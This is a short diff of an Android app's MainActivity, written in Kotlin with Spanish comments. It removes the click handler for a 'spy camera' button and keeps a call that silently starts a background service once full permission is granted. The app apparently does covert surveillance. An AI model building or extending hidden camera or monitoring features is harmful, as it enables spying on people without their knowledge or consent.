@@ -116,9 +116,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         // Botón Cámara (Espía manual)
-        findViewById<ImageButton>(R.id.btn_spy_cam).setOnClickListener {
-            checkPermissionAndStart(PERMISSION_REQUEST_SPY_BUTTON)
-        }
+
 
         // Inicio automático silencioso (Solo si ya tiene permiso FULL)
         iniciarServicioSilencioso()
